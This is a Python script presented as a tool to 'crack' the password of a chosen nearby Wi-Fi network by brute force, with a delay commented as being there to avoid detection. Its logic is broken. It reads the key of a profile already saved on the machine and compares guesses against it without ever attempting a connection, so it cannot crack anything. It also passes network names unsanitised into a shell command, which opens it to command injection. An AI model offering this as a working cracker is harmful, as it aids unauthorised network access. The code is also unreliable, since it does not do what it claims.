import itertools
import time
import subprocess

def get_wifi_password(network_name):
    try:
        cmd = f"netsh wlan show profile name={network_name} key=clear"
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, universal_newlines=True)
        password_index = output.index("Key Content") + 29
        password = output[password_index:].splitlines()[0]
        return password
    except Exception:
        return None

def brute_force_password(characters, max_length):
    for length in range(1, max_length + 1):
        for password in itertools.product(characters, repeat=length):
            password = ''.join(password)
            network_password = get_wifi_password(network_name)
            if network_password == password:
                return password
            time.sleep(0.1)  # Delay to avoid detection

networks = subprocess.check_output("netsh wlan show networks mode=Bssid", shell=True, stderr=subprocess.DEVNULL, universal_newlines=True)
network_list = [line.split(":")[1].strip() for line in networks.splitlines() if "SSID" in line]
print("Available networks:")
for i, network in enumerate(network_list):
    print(f"[{i+1}] {network}")

network_index = int(input("Enter the index of the network to crack: ")) - 1
network_name = network_list[network_index]

characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*"
max_password_length = int(input("Enter the maximum length of the password: "))
password = brute_force_password(characters, max_password_length)
if password:
    print(f"The cracked password for '{network_name}' is: {password}")
else:
    print("Unable to crack the password.")
